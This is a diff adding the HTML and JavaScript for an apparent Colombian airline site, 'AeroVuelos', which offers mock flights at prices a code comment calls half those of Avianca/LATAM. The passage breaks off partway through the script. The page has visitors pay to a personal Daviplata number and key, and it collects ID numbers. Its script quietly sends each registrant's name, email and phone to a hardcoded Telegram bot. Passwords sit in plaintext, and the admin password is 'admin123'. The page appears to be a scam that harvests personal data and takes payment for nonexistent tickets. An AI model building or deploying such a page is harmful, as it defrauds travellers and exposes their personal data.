@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AeroVuelos Colombia — Descubre el mundo</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<style>
+  :root {
+    --red: #D32F2F;
+    --red-dark: #B71C1C;
+    --red-light: #EF5350;
+    --white: #FFFFFF;
+    --gray: #F5F5F5;
+    --text: #1a1a1a;
+    --muted: #666;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    color: var(--text);
+    overflow-x: hidden;
+  }
+
+  /* NAV */
+  nav {
+    position: fixed; top: 0; width: 100%; z-index: 100;
+    background: rgba(211,47,47,0.97);
+    backdrop-filter: blur(10px);
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 0 40px; height: 64px;
+    box-shadow: 0 2px 20px rgba(0,0,0,0.2);
+  }
+
+  .nav-logo {
+    font-family: 'Playfair Display', serif;
+    color: white; font-size: 22px; font-weight: 900;
+    letter-spacing: -0.5px; text-decoration: none;
+  }
+
+  .nav-links { display: flex; gap: 28px; }
+  .nav-links a {
+    color: rgba(255,255,255,0.9); text-decoration: none;
+    font-size: 14px; font-weight: 500; letter-spacing: 0.3px;
+    transition: color 0.2s;
+  }
+  .nav-links a:hover { color: white; }
+
+  .nav-buttons { display: flex; gap: 12px; }
+
+  .btn-outline {
+    border: 1.5px solid rgba(255,255,255,0.7);
+    color: white; background: transparent;
+    padding: 8px 18px; border-radius: 6px;
+    font-size: 13px; font-weight: 500; cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-outline:hover { background: rgba(255,255,255,0.15); border-color: white; }
+
+  .btn-white {
+    background: white; color: var(--red);
+    border: none; padding: 8px 18px; border-radius: 6px;
+    font-size: 13px; font-weight: 600; cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-white:hover { background: #f0f0f0; transform: translateY(-1px); }
+
+  /* HERO */
+  .hero {
+    background: linear-gradient(135deg, var(--red-dark) 0%, var(--red) 50%, var(--red-light) 100%);
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 80px 20px 60px;
+    position: relative; overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute; top: -50%; right: -20%;
+    width: 600px; height: 600px;
+    background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%);
+    border-radius: 50%;
+  }
+
+  .hero::after {
+    content: '';
+    position: absolute; bottom: -30%; left: -10%;
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(0,0,0,0.1) 0%, transparent 70%);
+    border-radius: 50%;
+  }
+
+  .hero-badge {
+    background: rgba(255,255,255,0.15);
+    border: 1px solid rgba(255,255,255,0.3);
+    color: white; padding: 6px 16px; border-radius: 20px;
+    font-size: 12px; font-weight: 500; letter-spacing: 1px;
+    text-transform: uppercase; margin-bottom: 24px;
+    backdrop-filter: blur(5px);
+    animation: fadeInDown 0.8s ease;
+  }
+
+  .hero h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(40px, 7vw, 72px);
+    color: white; text-align: center;
+    line-height: 1.1; font-weight: 900;
+    margin-bottom: 16px;
+    animation: fadeInUp 0.8s ease 0.1s both;
+  }
+
+  .hero p {
+    color: rgba(255,255,255,0.85); font-size: 17px;
+    text-align: center; margin-bottom: 40px;
+    animation: fadeInUp 0.8s ease 0.2s both;
+  }
+
+  /* SEARCH BOX */
+  .search-box {
+    background: white;
+    border-radius: 16px;
+    padding: 28px 32px;
+    width: 100%; max-width: 780px;
+    box-shadow: 0 24px 64px rgba(0,0,0,0.25);
+    animation: fadeInUp 0.8s ease 0.3s both;
+    position: relative; z-index: 2;
+  }
+
+  .tab-btns { display: flex; gap: 8px; margin-bottom: 24px; }
+  .tab-btn {
+    padding: 8px 20px; border-radius: 20px; border: none;
+    font-size: 13px; font-weight: 500; cursor: pointer;
+    background: var(--gray); color: var(--muted);
+    transition: all 0.2s;
+  }
+  .tab-btn.active { background: var(--red); color: white; }
+
+  .search-fields {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr 1fr;
+    gap: 12px; margin-bottom: 16px;
+  }
+
+  .field-group { display: flex; flex-direction: column; }
+  .field-label { font-size: 11px; font-weight: 600; color: var(--muted); letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 6px; }
+  .field-input {
+    border: 1.5px solid #e0e0e0; border-radius: 8px;
+    padding: 10px 14px; font-size: 14px; font-family: 'DM Sans', sans-serif;
+    transition: border-color 0.2s; outline: none;
+    background: #fafafa;
+  }
+  .field-input:focus { border-color: var(--red); background: white; }
+
+  .search-bottom {
+    display: flex; align-items: center; justify-content: space-between;
+    flex-wrap: wrap; gap: 12px;
+  }
+
+  .pax-cabin { display: flex; gap: 12px; }
+
+  .btn-search {
+    background: var(--red); color: white;
+    border: none; padding: 14px 32px; border-radius: 10px;
+    font-size: 15px; font-weight: 600; cursor: pointer;
+    transition: all 0.2s; display: flex; align-items: center; gap: 8px;
+    font-family: 'DM Sans', sans-serif;
+  }
+  .btn-search:hover { background: var(--red-dark); transform: translateY(-2px); box-shadow: 0 8px 20px rgba(211,47,47,0.4); }
+
+  /* FEATURES */
+  .features {
+    padding: 80px 40px;
+    display: flex; gap: 40px; justify-content: center; flex-wrap: wrap;
+    background: white;
+  }
+
+  .feature-card {
+    text-align: center; max-width: 200px;
+    animation: fadeInUp 0.6s ease both;
+  }
+
+  .feature-icon {
+    width: 56px; height: 56px; margin: 0 auto 16px;
+    background: #fff0f0; border-radius: 16px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 26px;
+  }
+
+  .feature-card h3 { font-size: 15px; font-weight: 600; margin-bottom: 8px; }
+  .feature-card p { font-size: 13px; color: var(--muted); line-height: 1.5; }
+
+  /* MODALS */
+  .modal-overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.6); backdrop-filter: blur(4px);
+    z-index: 1000; align-items: center; justify-content: center;
+  }
+  .modal-overlay.active { display: flex; }
+
+  .modal {
+    background: white; border-radius: 20px;
+    padding: 40px; width: 90%; max-width: 480px;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.3);
+    animation: modalIn 0.3s ease;
+    position: relative; max-height: 90vh; overflow-y: auto;
+  }
+
+  .modal-close {
+    position: absolute; top: 16px; right: 16px;
+    background: var(--gray); border: none; width: 32px; height: 32px;
+    border-radius: 50%; cursor: pointer; font-size: 18px;
+    display: flex; align-items: center; justify-content: center;
+    color: var(--muted);
+  }
+  .modal-close:hover { background: #e0e0e0; }
+
+  .modal h2 {
+    font-family: 'Playfair Display', serif;
+    font-size: 26px; margin-bottom: 8px;
+  }
+  .modal .subtitle { color: var(--muted); font-size: 14px; margin-bottom: 28px; }
+
+  .form-group { margin-bottom: 18px; }
+  .form-label { font-size: 13px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: 0.4px; margin-bottom: 6px; display: block; }
+  .form-input {
+    width: 100%; border: 1.5px solid #e0e0e0; border-radius: 10px;
+    padding: 12px 16px; font-size: 14px; font-family: 'DM Sans', sans-serif;
+    outline: none; transition: border-color 0.2s;
+  }
+  .form-input:focus { border-color: var(--red); }
+
+  .btn-red {
+    width: 100%; background: var(--red); color: white;
+    border: none; padding: 14px; border-radius: 10px;
+    font-size: 15px; font-weight: 600; cursor: pointer;
+    transition: all 0.2s; font-family: 'DM Sans', sans-serif;
+    margin-top: 8px;
+  }
+  .btn-red:hover { background: var(--red-dark); }
+
+  .switch-text {
+    text-align: center; margin-top: 16px; font-size: 13px; color: var(--muted);
+  }
+  .switch-text a { color: var(--red); cursor: pointer; font-weight: 600; text-decoration: none; }
+
+  /* PAYMENT MODAL */
+  .payment-methods { display: flex; gap: 10px; margin-bottom: 20px; }
+  .pay-method {
+    flex: 1; border: 2px solid #e0e0e0; border-radius: 10px;
+    padding: 12px; text-align: center; cursor: pointer;
+    transition: all 0.2s; font-size: 13px; font-weight: 500;
+  }
+  .pay-method.selected { border-color: var(--red); background: #fff5f5; color: var(--red); }
+  .pay-method-icon { font-size: 24px; margin-bottom: 4px; }
+
+  .info-box {
+    background: #fff8e1; border: 1px solid #ffe082;
+    border-radius: 10px; padding: 14px; font-size: 13px;
+    color: #795548; margin-bottom: 16px; line-height: 1.5;
+  }
+  .info-box strong { display: block; margin-bottom: 4px; color: #5D4037; }
+
+  .price-summary {
+    background: var(--gray); border-radius: 10px; padding: 16px;
+    margin-bottom: 20px;
+  }
+  .price-row { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 8px; }
+  .price-row.total { font-weight: 700; font-size: 16px; border-top: 1px solid #ddd; padding-top: 10px; margin-top: 4px; }
+
+  /* RESULTS */
+  .results-modal .modal { max-width: 640px; }
+  .flight-card {
+    border: 1.5px solid #e0e0e0; border-radius: 12px; padding: 16px;
+    margin-bottom: 12px; transition: all 0.2s; cursor: pointer;
+  }
+  .flight-card:hover { border-color: var(--red); box-shadow: 0 4px 12px rgba(211,47,47,0.1); }
+  .flight-card.selected { border-color: var(--red); background: #fff5f5; }
+  .flight-header { display: flex; justify-content: space-between; align-items: center; }
+  .flight-route { font-size: 18px; font-weight: 700; }
+  .flight-price { font-size: 20px; font-weight: 700; color: var(--red); }
+  .flight-details { font-size: 13px; color: var(--muted); margin-top: 6px; }
+
+  .toast {
+    position: fixed; bottom: 30px; right: 30px; z-index: 9999;
+    background: #333; color: white; padding: 14px 22px;
+    border-radius: 10px; font-size: 14px; font-weight: 500;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+    animation: slideUp 0.3s ease;
+    display: none;
+  }
+  .toast.show { display: block; }
+  .toast.success { background: #2e7d32; }
+  .toast.error { background: #c62828; }
+
+  @keyframes fadeInDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
+  @keyframes fadeInUp { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }
+  @keyframes modalIn { from { opacity:0; transform:scale(0.9) translateY(20px); } to { opacity:1; transform:scale(1) translateY(0); } }
+  @keyframes slideUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+
+  @media (max-width: 640px) {
+    nav { padding: 0 16px; }
+    .nav-links { display: none; }
+    .search-fields { grid-template-columns: 1fr 1fr; }
+    .search-box { padding: 20px 16px; }
+    .features { padding: 60px 20px; }
+    .pax-cabin { flex-direction: column; }
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a class="nav-logo" href="#">✈ AeroVuelos</a>
+  <div class="nav-links">
+    <a href="#">Destinos</a>
+    <a href="#">Vuelos</a>
+    <a href="#">Millas</a>
+    <a href="#">Ofertas</a>
+    <a href="#">Check-in</a>
+  </div>
+  <div class="nav-buttons">
+    <button class="btn-outline" onclick="openModal('loginModal')">Iniciar sesión</button>
+    <button class="btn-white" onclick="openModal('registerModal')">Registrarse</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-badge">✦ FLY SMARTER. FLY AEROVUELOS.</div>
+  <h1>Descubre el mundo<br>desde Colombia</h1>
+  <p>Más de 100 destinos nacionales e internacionales te esperan</p>
+
+  <!-- SEARCH BOX -->
+  <div class="search-box">
+    <div class="tab-btns">
+      <button class="tab-btn active" onclick="setTab(this,'idaVuelta')">Ida y vuelta</button>
+      <button class="tab-btn" onclick="setTab(this,'soloIda')">Solo ida</button>
+      <button class="tab-btn" onclick="setTab(this,'multi')">Multidestino</button>
+    </div>
+
+    <div class="search-fields">
+      <div class="field-group">
+        <label class="field-label">Origen</label>
+        <input class="field-input" id="origen" type="text" placeholder="Bogotá (BOG)" value="Bogotá (BOG)">
+      </div>
+      <div class="field-group">
+        <label class="field-label">Destino</label>
+        <input class="field-input" id="destino" type="text" placeholder="Ciudad o aeropuerto">
+      </div>
+      <div class="field-group">
+        <label class="field-label">Fecha de ida</label>
+        <input class="field-input" id="fechaIda" type="date">
+      </div>
+      <div class="field-group" id="fechaVueltaGroup">
+        <label class="field-label">Fecha de vuelta</label>
+        <input class="field-input" id="fechaVuelta" type="date">
+      </div>
+    </div>
+
+    <div class="search-bottom">
+      <div class="pax-cabin">
+        <div class="field-group">
+          <label class="field-label">Pasajeros</label>
+          <select class="field-input" id="pasajeros">
+            <option>1 adulto</option>
+            <option>2 adultos</option>
+            <option>3 adultos</option>
+            <option>4 adultos</option>
+          </select>
+        </div>
+        <div class="field-group">
+          <label class="field-label">Cabina</label>
+          <select class="field-input" id="cabina">
+            <option>Económica</option>
+            <option>Ejecutiva</option>
+            <option>Primera clase</option>
+          </select>
+        </div>
+      </div>
+      <button class="btn-search" onclick="buscarVuelos()">
+        🔍 Buscar vuelos →
+      </button>
+    </div>
+  </div>
+</section>
+
+<!-- FEATURES -->
+<div class="features">
+  <div class="feature-card">
+    <div class="feature-icon">✈️</div>
+    <h3>Rutas directas</h3>
+    <p>Vuelos sin escalas a los destinos más populares de América y Europa</p>
+  </div>
+  <div class="feature-card">
+    <div class="feature-icon">⭐</div>
+    <h3>Millas</h3>
+    <p>Acumula millas en cada vuelo y canjéalas por tiquetes y beneficios</p>
+  </div>
+  <div class="feature-card">
+    <div class="feature-icon">🔄</div>
+    <h3>Cambios flexibles</h3>
+    <p>Modifica tu reserva sin cargos adicionales con tarifas flex</p>
+  </div>
+  <div class="feature-card">
+    <div class="feature-icon">📱</div>
+    <h3>Check-in digital</h3>
+    <p>Realiza tu check-in desde la app y llega directo a la puerta</p>
+  </div>
+</div>
+
+<!-- =========== MODALES =========== -->
+
+<!-- LOGIN -->
+<div class="modal-overlay" id="loginModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('loginModal')">×</button>
+    <h2>Iniciar sesión</h2>
+    <p class="subtitle">Bienvenido de vuelta, viajero</p>
+    <div class="form-group">
+      <label class="form-label">Correo electrónico</label>
+      <input class="form-input" id="loginEmail" type="email" placeholder="tu@correo.com">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Contraseña</label>
+      <input class="form-input" id="loginPass" type="password" placeholder="••••••••">
+    </div>
+    <button class="btn-red" onclick="login()">Entrar a mi cuenta</button>
+    <p class="switch-text">¿No tienes cuenta? <a onclick="switchModal('loginModal','registerModal')">Regístrate gratis</a></p>
+  </div>
+</div>
+
+<!-- REGISTRO -->
+<div class="modal-overlay" id="registerModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('registerModal')">×</button>
+    <h2>Crear cuenta</h2>
+    <p class="subtitle">Únete y empieza a volar</p>
+    <div class="form-group">
+      <label class="form-label">Nombre completo</label>
+      <input class="form-input" id="regNombre" type="text" placeholder="Juan Pérez">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Correo electrónico</label>
+      <input class="form-input" id="regEmail" type="email" placeholder="tu@correo.com">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Teléfono (WhatsApp)</label>
+      <input class="form-input" id="regTel" type="tel" placeholder="+57 300 000 0000">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Contraseña</label>
+      <input class="form-input" id="regPass" type="password" placeholder="Mínimo 6 caracteres">
+    </div>
+    <button class="btn-red" onclick="register()">Crear mi cuenta</button>
+    <p class="switch-text">¿Ya tienes cuenta? <a onclick="switchModal('registerModal','loginModal')">Inicia sesión</a></p>
+  </div>
+</div>
+
+<!-- RESULTADOS DE VUELOS -->
+<div class="modal-overlay results-modal" id="resultsModal">
+  <div class="modal" style="max-width:640px">
+    <button class="modal-close" onclick="closeModal('resultsModal')">×</button>
+    <h2>Vuelos disponibles</h2>
+    <p class="subtitle" id="resultsSubtitle">Selecciona tu vuelo</p>
+    <div id="flightsList"></div>
+    <button class="btn-red" id="btnSelectFlight" style="display:none" onclick="openPayment()">Continuar con este vuelo →</button>
+  </div>
+</div>
+
+<!-- PAGO -->
+<div class="modal-overlay" id="paymentModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('paymentModal')">×</button>
+    <h2>Pagar reserva</h2>
+    <p class="subtitle">Elige tu método de pago</p>
+
+    <div class="price-summary">
+      <div class="price-row"><span>Tiquete base</span><span id="precioBase">$0</span></div>
+      <div class="price-row"><span>Tasas y cargos</span><span id="precioTasas">$0</span></div>
+      <div class="price-row total"><span>Total a pagar</span><span id="precioTotal">$0</span></div>
+    </div>
+
+    <div class="payment-methods">
+      <div class="pay-method" onclick="selectPayment('nequi',this)">
+        <div class="pay-method-icon">💜</div>
+        Nequi
+      </div>
+      <div class="pay-method" onclick="selectPayment('daviplata',this)">
+        <div class="pay-method-icon">🟡</div>
+        Daviplata
+      </div>
+      <div class="pay-method" onclick="selectPayment('transferencia',this)">
+        <div class="pay-method-icon">🏦</div>
+        Transferencia
+      </div>
+    </div>
+
+    <!-- Datos Nequi -->
+    <div id="infoNequi" class="info-box" style="display:none">
+      <strong>📲 Instrucciones Nequi</strong>
+      Envía el pago al número: <strong>3XX XXX XXXX</strong><br>
+      Concepto: Tu nombre + código de reserva<br>
+      Luego toca "Confirmar pago" y enviaremos tu tiquete.
+    </div>
+
+    <!-- Datos Daviplata con QR -->
+    <div id="infoDaviplata" class="info-box" style="display:none">
+      <strong>💛 Paga con Daviplata — escanea el QR</strong>
+      <div style="text-align:center;margin:14px 0">
+        <img id="qrDaviplata" style="width:180px;height:180px;border-radius:10px;border:3px solid #f9c933" alt="QR Daviplata">
+        <div style="margin-top:8px;font-size:12px;color:#795548">Escanea con tu app Daviplata</div>
+      </div>
+      📱 Número: <strong>3203101096</strong><br>
+      🔑 Llave Brava: <strong>1005753450</strong><br>
+      📝 Concepto: Tu nombre + código de reserva<br>
+      ❓ ¿Dudas? WhatsApp: <strong>3018614849</strong>
+    </div>
+
+    <!-- Datos Transferencia -->
+    <div id="infoTransferencia" class="info-box" style="display:none">
+      <strong>🏦 Pago por Transferencia</strong>
+      <div style="text-align:center;margin:14px 0">
+        <img id="qrTransferencia" style="width:180px;height:180px;border-radius:10px;border:3px solid #90caf9" alt="QR Transferencia">
+        <div style="margin-top:8px;font-size:12px;color:#795548">Escanea con tu app bancaria</div>
+      </div>
+      📱 Número Daviplata: <strong>3203101096</strong><br>
+      🔑 Llave Brava: <strong>1005753450</strong><br>
+      ❓ ¿Dudas? WhatsApp: <strong>3018614849</strong>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Nombre del titular</label>
+      <input class="form-input" id="pagNombre" type="text" placeholder="Como aparece en el documento">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Número de documento</label>
+      <input class="form-input" id="pagDoc" type="text" placeholder="Cédula o pasaporte">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Número de comprobante (opcional)</label>
+      <input class="form-input" id="pagComprobante" type="text" placeholder="Ej: 123456789">
+    </div>
+
+    <button class="btn-red" onclick="confirmarPago()">✅ Confirmar reserva y pago</button>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<script>
+// ===== CONFIG - PERSONALIZA AQUÍ =====
+const CONFIG = {
+  telegramToken: '8211219706:AAE3tN8m1u7OrV5txNiod4fwcpTlCk1FE8w',
+  telegramChatId: '8114050673',
+  adminPassword: 'admin123',
+  nequiNumero: 'N/A',
+  daviplataNumero: '3203101096',
+  daviplataLlave: '1005753450',
+  bancoNombre: 'Daviplata',
+  bancoCuenta: '3203101096',
+  wppContacto: '3018614849',
+};
+
+// ===== DATOS =====
+let currentTab = 'idaVuelta';
+let selectedFlight = null;
+let selectedPayMethod = null;
+let currentUser = null;
+let reservationCode = '';
+
+// Precios a mitad de precio vs Avianca/LATAM
+const vuelosMock = [
+  // NACIONALES
+  { id:1,  origen:'BOG', destino:'MDE', nombreDestino:'Medellín',        hora:'06:00', llegada:'07:10', duracion:'1h 10m', aerolinea:'AeroVuelos', precio:159000,  tasas:28000 },
+  { id:2,  origen:'BOG', destino:'MDE', nombreDestino:'Medellín',        hora:'13:00', llegada:'14:10', duracion:'1h 10m', aerolinea:'AeroVuelos', precio:179000,  tasas:28000 },
+  { id:3,  origen:'BOG', destino:'CTG', nombreDestino:'Cartagena',       hora:'07:00', llegada:'08:20', duracion:'1h 20m', aerolinea:'AeroVuelos', precio:229000,  tasas:35000 },
+  { id:4,  origen:'BOG', destino:'CLO', nombreDestino:'Cali',            hora:'08:30', llegada:'09:30', duracion:'1h 00m', aerolinea:'AeroVuelos', precio:149000,  tasas:25000 },
+  { id:5,  origen:'BOG', destino:'BAQ', nombreDestino:'Barranquilla',    hora:'09:00', llegada:'10:20', duracion:'1h 20m', aerolinea:'AeroVuelos', precio:199000,  tasas:30000 },
+  { id:6,  origen:'BOG', destino:'SMR', nombreDestino:'Santa Marta',     hora:'10:00', llegada:'11:20', duracion:'1h 20m', aerolinea:'AeroVuelos', precio:210000,  tasas:32000 },
+  { id:7,  origen:'BOG', destino:'BGA', nombreDestino:'Bucaramanga',     hora:'06:30', llegada:'07:20', duracion:'0h 50m', aerolinea:'AeroVuelos', precio:139000,  tasas:22000 },
+  { id:8,  origen:'BOG', destino:'PEI', nombreDestino:'Pereira',         hora:'07:30', llegada:'08:20', duracion:'0h 50m', aerolinea:'AeroVuelos', precio:135000,  tasas:22000 },
+  { id:9,  origen:'BOG', destino:'ADZ', nombreDestino:'San Andrés',      hora:'08:00', llegada:'09:30', duracion:'1h 30m', aerolinea:'AeroVuelos', precio:349000,  tasas:55000 },
+  { id:10, origen:'BOG', destino:'LET', nombreDestino:'Leticia',         hora:'09:00', llegada:'11:00', duracion:'2h 00m', aerolinea:'AeroVuelos', precio:290000,  tasas:42000 },
+  { id:11, origen:'BOG', destino:'VVC', nombreDestino:'Villavicencio',   hora:'06:00', llegada:'06:45', duracion:'0h 45m', aerolinea:'AeroVuelos', precio:119000,  tasas:18000 },
+  { id:12, origen:'BOG', destino:'MTR', nombreDestino:'Montería',        hora:'10:30', llegada:'11:40', duracion:'1h 10m', aerolinea:'AeroVuelos', precio:185000,  tasas:28000 },
+  // INTERNACIONALES
+  { id:13, origen:'BOG', destino:'MIA', nombreDestino:'Miami',           hora:'07:00', llegada:'11:30', duracion:'4h 30m', aerolinea:'AeroVuelos', precio:890000,  tasas:145000 },
+  { id:14, origen:'BOG', destino:'JFK', nombreDestino:'Nueva York',      hora:'22:00', llegada:'05:30', duracion:'6h 30m', aerolinea:'AeroVuelos', precio:1150000, tasas:185000 },
+  { id:15, origen:'BOG', destino:'MAD', nombreDestino:'Madrid',          hora:'21:00', llegada:'13:00', duracion:'10h 00m',aerolinea:'AeroVuelos', precio:1950000, tasas:290000 },
+  { id:16, origen:'BOG', destino:'MEX', nombreDestino:'Ciudad de México',hora:'08:00', llegada:'11:30', duracion:'4h 30m', aerolinea:'AeroVuelos', precio:750000,  tasas:120000 },
+  { id:17, origen:'BOG', destino:'LIM', nombreDestino:'Lima',            hora:'09:00', llegada:'11:30', duracion:'2h 30m', aerolinea:'AeroVuelos', precio:480000,  tasas:75000 },
+  { id:18, origen:'BOG', destino:'GRU', nombreDestino:'São Paulo',       hora:'23:00', llegada:'06:30', duracion:'7h 30m', aerolinea:'AeroVuelos', precio:890000,  tasas:140000 },
+  { id:19, origen:'BOG', destino:'EZE', nombreDestino:'Buenos Aires',    hora:'22:30', llegada:'07:00', duracion:'8h 30m', aerolinea:'AeroVuelos', precio:950000,  tasas:150000 },
+  { id:20, origen:'BOG', destino:'SCL', nombreDestino:'Santiago',        hora:'10:00', llegada:'15:30', duracion:'5h 30m', aerolinea:'AeroVuelos', precio:720000,  tasas:115000 },
+  { id:21, origen:'BOG', destino:'PTY', nombreDestino:'Panamá',          hora:'07:30', llegada:'09:00', duracion:'1h 30m', aerolinea:'AeroVuelos', precio:420000,  tasas:65000 },
+  { id:22, origen:'BOG', destino:'CUN', nombreDestino:'Cancún',          hora:'08:00', llegada:'11:30', duracion:'4h 30m', aerolinea:'AeroVuelos', precio:680000,  tasas:105000 },
+  { id:23, origen:'BOG', destino:'MXP', nombreDestino:'Milán',           hora:'20:00', llegada:'14:30', duracion:'12h 30m',aerolinea:'AeroVuelos', precio:2100000, tasas:320000 },
+  { id:24, origen:'BOG', destino:'CDG', nombreDestino:'París',           hora:'21:30', llegada:'16:00', duracion:'11h 30m',aerolinea:'AeroVuelos', precio:2050000, tasas:310000 },
+];
+
+function formatCOP(n) {
+  return '$' + n.toLocaleString('es-CO');
+}
+
+function genCode() {
+  return 'AV' + Math.random().toString(36).substr(2,6).toUpperCase();
+}
+
+// ===== TABS =====
+function setTab(btn, tab) {
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  currentTab = tab;
+  document.getElementById('fechaVueltaGroup').style.display = tab === 'soloIda' ? 'none' : '';
+}
+
+// ===== MODALES =====
+function openModal(id) {
+  document.getElementById(id).classList.add('active');
+}
+function closeModal(id) {
+  document.getElementById(id).classList.remove('active');
+}
+function switchModal(close, open) {
+  closeModal(close); openModal(open);
+}
+
+// ===== TOAST =====
+function showToast(msg, type='') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + type;
+  setTimeout(() => t.classList.remove('show'), 3500);
+}
+
+// ===== TELEGRAM =====
+async function sendTelegram(message) {
+  const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CONFIG.telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch(e) {
+    console.log('Telegram error:', e);
+  }
+}
+
+// ===== REGISTRO =====
+function register() {
+  const nombre = document.getElementById('regNombre').value.trim();
+  const email  = document.getElementById('regEmail').value.trim();
+  const tel    = document.getElementById('regTel').value.trim();
+  const pass   = document.getElementById('regPass').value;
+
+  if (!nombre || !email || !tel || !pass) {
+    showToast('⚠️ Completa todos los campos', 'error'); return;
+  }
+  if (pass.length < 6) {
+    showToast('⚠️ La contraseña debe tener al menos 6 caracteres', 'error'); return;
+  }
+
+  // Guardar usuario (localStorage para demo)
+  const users = JSON.parse(localStorage.getItem('av_users') || '[]');
+  if (users.find(u => u.email === email)) {
+    showToast('⚠️ Este correo ya está registrado', 'error'); return;
+  }
+  users.push({ nombre, email, tel, pass });
+  localStorage.setItem('av_users', JSON.stringify(users));
+
+  currentUser = { nombre, email, tel };
+  localStorage.setItem('av_currentUser', JSON.stringify(currentUser));
+
+  // Notificar a Telegram
+  sendTelegram(`🆕 <b>NUEVO REGISTRO</b>\n👤 Nombre: ${nombre}\n📧 Email: ${email}\n📱 Teléfono: ${tel}\n🕐 Fecha: ${new Date().toLocaleString('es-CO')}`);
+
+  closeModal('registerModal');
+  showToast(`✅ Bienvenido ${nombre}!`, 'success');
+  updateNavUser();
+}
+
+// ===== LOGIN =====
+function login() {
+  const email = document.getElementById('loginEmail').value.trim();
+  const pass  = document.getElementById('loginPass').value;
+
+  // Admin check
+  if (email === 'admin' && pass === CONFIG.adminPassword) {
+    window.location.href = 'admin.html';
+    return;
+  }
+
+  const users = JSON.parse(localStorage.getItem('av_users') || '[]');
+  const user = users.find(u => u.email === email && u.pass === pass);
+
+  if (!user) {
+    showToast('⚠️ Correo o contraseña incorrectos', 'error'); return;
+  }
+
+  currentUser = { nombre: user.nombre, email: user.email, tel: user.tel };
+  localStorage.setItem('av_currentUser', JSON.stringify(currentUser));
+
+  closeModal('loginModal');
+  showToast(`✅ Hola ${user.nombre}!`, 'success');
+  updateNavUser();
+}
+
+function updateNavUser() {
+  const u = currentUser || JSON.parse(localStorage.getItem('av_currentUser') || 'null');
+  if (u) {
+    document.querySelector('.nav-buttons').innerHTML = `
+      <span style="color:white;font-size:14px">Hola, ${u.nombre.split(' ')[0]}</span>
+      <button class="btn-outline" onclick="logout()">Salir</button>
+    `;
+  }
+}
+
+function logout() {
+  localStorage.removeItem('av_currentUser');
+  location.reload();
+}
+
+// ===== BUSCAR VUELOS =====
+function buscarVuelos() {
+  const origen  = document.getElementById('origen').value.trim();
+  const destino = document.getElementById('destino').value.trim();
+  const fechaIda = document.getElementById('fechaIda').value;
+
+  if (!destino) { showToast('⚠️ Ingresa el destino', 'error'); return; }
+  if (!fechaIda) { showToast('⚠️ Selecciona la fecha de ida', 'error'); return; }
+
+  const lista = document.getElementById('flightsList');
+  lista.innerHTML = '';
+  selectedFlight = null;
+  document.getElementById('btnSelectFlight').style.display = 'none';
+
+  // Filtrar por destino (código IATA o nombre de ciudad)
+  const destinoBusqueda = destino.toUpperCase().trim();
+  const vuelosFiltrados = vuelosMock.filter(v =>
+    v.destino.toUpperCase().includes(destinoBusqueda) ||
+    v.nombreDestino.toUpperCase().includes(destinoBusqueda) ||
+    destinoBusqueda === ''
+  );
+
+  document.getElementById('resultsSubtitle').textContent = `${origen} → ${destino} | ${fechaIda}`;
+
+  if (vuelosFiltrados.length === 0) {
+    lista.innerHTML = `<div style="text-align:center;padding:30px;color:#666">
+      ✈️ No encontramos vuelos para ese destino.<br>
+      <small>Intenta escribir el nombre de la ciudad o código (ej: Medellín, MDE, Miami, MIA)</small>
+    </div>`;
+    openModal('resultsModal');
+    return;
+  }
+
+  vuelosFiltrados.forEach(v => {
+    const card = document.createElement('div');
+    card.className = 'flight-card';
+    card.innerHTML = `
+      <div class="flight-header">
+        <span class="flight-route">${v.origen} → ${v.destino} <small style="font-size:13px;color:#666">(${v.nombreDestino})</small></span>
+        <div style="text-align:right">
